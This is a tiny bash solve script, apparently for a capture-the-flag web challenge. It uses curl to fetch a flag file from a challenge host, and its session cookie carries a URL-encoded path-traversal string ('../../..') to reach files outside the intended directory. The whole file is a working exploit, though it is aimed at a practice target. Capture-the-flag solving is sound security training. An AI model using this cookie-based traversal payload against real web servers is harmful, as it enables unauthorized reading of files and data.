#!/usr/bin/env bash
#!CMD: ./solve.sh
HOST="http://challs.crate.nu:2580"

curl -s "$HOST/uploaded/flag.txt" -H "Cookie: session=$(echo "../../../../../../../.." | urlencode);" | grep cratectf
